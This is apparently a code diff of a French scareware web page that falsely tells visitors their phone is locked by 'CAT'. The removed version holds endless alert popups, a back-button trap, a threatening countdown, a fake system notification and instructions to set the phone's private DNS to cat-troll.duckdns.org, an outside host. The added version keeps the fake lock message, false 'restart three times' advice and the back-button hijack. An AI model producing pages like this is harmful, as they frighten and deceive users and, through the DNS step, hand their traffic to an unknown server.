@@ -1,244 +1,40 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🔴 TÉLÉPHONE VERROUILLÉ</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            background: #0a0a0a;
-            font-family: 'Courier New', monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            animation: flash 1s infinite alternate;
-        }
-        @keyframes flash {
-            0% { background: #0a0a0a; }
-            100% { background: #1a0000; }
-        }
-        .container {
-            max-width: 500px;
-            width: 100%;
-            background: rgba(20,0,0,0.8);
-            border: 2px solid #ff3355;
-            border-radius: 30px;
-            padding: 30px 25px;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(255,0,0,0.3);
-        }
-        h1 {
-            color: #ff3355;
-            font-size: 2.2em;
-            letter-spacing: 5px;
-            text-shadow: 0 0 20px #ff3355;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
-        .sub {
-            color: #ff6666;
-            font-size: 1em;
-            margin: 15px 0 25px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 15px;
-        }
-        .instructions {
-            background: #111;
-            border-radius: 16px;
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 4px solid #ff3355;
-            text-align: left;
-        }
-        .instructions p {
-            color: #ff8888;
-            font-size: 0.95em;
-            margin: 8px 0;
-        }
-        .instructions strong {
-            color: #00ff88;
-        }
-        .code-block {
-            background: #0a0a0a;
-            padding: 12px;
-            border-radius: 10px;
-            margin: 10px 0;
-            text-align: center;
-            font-size: 1.4em;
-            color: #00ff88;
-            letter-spacing: 2px;
-            border: 1px solid #00ff8855;
-            word-break: break-all;
-        }
-        .btn {
-            display: inline-block;
-            background: #00ff88;
-            color: #0a0a0a;
-            border: none;
-            padding: 16px 30px;
-            font-size: 1.1em;
-            font-weight: bold;
-            border-radius: 50px;
-            margin: 15px 0 10px;
-            cursor: pointer;
-            transition: 0.3s;
-            width: 100%;
-        }
-        .btn:hover {
-            background: #00cc77;
-            transform: scale(1.02);
-        }
-        .btn-danger {
-            background: #ff3355;
-            color: #fff;
-        }
-        .btn-danger:hover {
-            background: #cc1133;
-        }
-        .footer {
-            margin-top: 25px;
-            font-size: 0.7em;
-            color: #444;
-            border-top: 1px solid #1a1a1a;
-            padding-top: 15px;
-        }
-        .glitch {
-            color: #ff3355;
-            font-size: 0.8em;
-            animation: blink 0.5s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-        .timer {
-            font-size: 2em;
-            color: #ff3355;
-            margin: 15px 0;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔴 VERROUILLÉ</title>
+<style>
+  * { margin:0; padding:0; }
+  body {
+    background: #0a0a0a;
+    color: #ff3355;
+    font-family: monospace;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: center;
+    animation: flash 0.5s infinite alternate;
+  }
+  @keyframes flash {
+    0% { background: #0a0a0a; }
+    100% { background: #1a0000; }
+  }
+  .box { max-width: 400px; padding: 30px; border: 2px solid #ff3355; border-radius: 20px; }
+  h1 { font-size: 2.5em; }
+  p { color: #ff8888; margin: 15px 0; }
+</style>
 </head>
 <body>
-
-<div class="container">
-    <h1>🔴 VERROUILLÉ</h1>
-    <div class="sub">⚠️ Sécurité CAT activée</div>
-
-    <div class="instructions">
-        <p>📲 Pour <strong>déverrouiller</strong> votre téléphone :</p>
-        <ol style="color:#ff8888; padding-left:20px; font-size:0.9em;">
-            <li>Allez dans <strong>Paramètres</strong></li>
-            <li><strong>Réseau et Internet</strong></li>
-            <li><strong>DNS privé</strong></li>
-            <li>Entrez le nom d'hôte :</li>
-        </ol>
-        <div class="code-block">cat-troll.duckdns.org</div>
-        <p style="color:#ff8888; font-size:0.85em;">✔️ Puis cliquez sur "Enregistrer"</p>
-    </div>
-
-    <button class="btn" onclick="ouvrirParametres()">
-        🔧 Ouvrir les paramètres DNS
-    </button>
-
-    <button class="btn btn-danger" onclick="resetTroll()">
-        🌀 Réinitialiser le réseau (cache)
-    </button>
-
-    <div class="timer" id="timer">⏳ 00:30</div>
-    <p style="color:#666; font-size:0.8em;">Temps restant avant verrouillage total</p>
-
-    <div class="glitch">⚠️ CAT vous surveille ⚠️</div>
-    <div class="footer">🔒 Session sécurisée • 256-bit AES</div>
+<div class="box">
+  <h1>🔴 VERROUILLÉ</h1>
+  <p>Votre téléphone a été sécurisé par <strong>CAT</strong>.</p>
+  <p style="font-size:0.8em; color:#666;">Redémarrez 3 fois pour déverrouiller.</p>
 </div>
-
 <script>
-    // ---------- POPUPS INFINIS ----------
-    setInterval(() => {
-        alert('🔴 VOTRE TÉLÉPHONE EST VERROUILLÉ PAR CAT');
-    }, 5000);
-
-    // ---------- BLOQUE LE BOUTON RETOUR ----------
-    history.pushState(null, null, window.location.href);
-    window.addEventListener('popstate', function() {
-        history.pushState(null, null, window.location.href);
-    });
-
-    // ---------- DÉTECTION ANDROID / IOS ----------
-    const isAndroid = navigator.userAgent.toLowerCase().includes('android');
-    const isIos = /iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase());
-
-    // ---------- OUVRE LES PARAMÈTRES DNS ----------
-    function ouvrirParametres() {
-        if (isAndroid) {
-            // Android 9+ : ouvre les paramètres réseau
-            window.location.href = 'intent://settings/#Intent;action=android.settings.WIFI_IP_SETTINGS;end';
-        } else if (isIos) {
-            alert('📲 Allez dans Réglages → Général → VPN et gestion d\'appareil → supprimez le profil CAT.');
-        } else {
-            alert('📲 Ouvrez manuellement vos paramètres réseau et entrez : cat-troll.duckdns.org');
-        }
-    }
-
-    // ---------- RÉINITIALISATION (cache) ----------
-    function resetTroll() {
-        if (isAndroid) {
-            alert('🔄 Pour réinitialiser votre DNS :\n\n' +
-                  '1. Allez dans Paramètres\n' +
-                  '2. Réseau et Internet\n' +
-                  '3. DNS privé\n' +
-                  '4. Sélectionnez "Automatique" ou "Désactivé"\n\n' +
-                  '🐱 CAT vous laisse partir... pour l\'instant.');
-            // Ouvre les paramètres DNS
-            window.location.href = 'intent://settings/#Intent;action=android.settings.WIFI_IP_SETTINGS;end';
-        } else if (isIos) {
-            alert('📲 Sur iOS, allez dans Réglages → VPN → supprimez le profil CAT.');
-        } else {
-            alert('🔄 Ouvrez vos paramètres réseau et remettez le DNS en automatique.');
-        }
-    }
-
-    // ---------- COMPTE À REBOURS (30 secondes) ----------
-    let timeLeft = 30;
-    const timerElement = document.getElementById('timer');
-
-    const countdown = setInterval(() => {
-        timeLeft--;
-        const minutes = Math.floor(timeLeft / 60);
-        const seconds = timeLeft % 60;
-        timerElement.textContent = `⏳ ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            timerElement.textContent = '⏳ 00:00';
-            // Crée une alerte visuelle
-            document.body.style.backgroundColor = '#ff0000';
-            document.body.style.animation = 'flash 0.3s infinite';
-            alert('🔴 VERROUILLAGE TOTAL : Contactez CAT d\'urgence.');
-        }
-    }, 1000);
-
-    // ---------- ENVOI D'UNE FAUSSE NOTIFICATION (sur Android) ----------
-    if (isAndroid) {
-        setTimeout(() => {
-            // Simule une notification système (ne fonctionne que si l'utilisateur a accordé les permissions)
-            if (Notification.permission === 'granted') {
-                new Notification('🔴 ALERTE CAT', {
-                    body: 'Votre téléphone est verrouillé. Suivez les instructions.',
-                    icon: 'https://i.imgur.com/6o0kS.png'
-                });
-            }
-        }, 5000);
-    }
-
-    console.log('🐱 CAT TROLL ACTIF - Version DNS DuckDNS');
+  history.pushState(null, null, location.href);
+  window.onpopstate = () => history.pushState(null, null, location.href);
 </script>
-
 </body>
 </html>
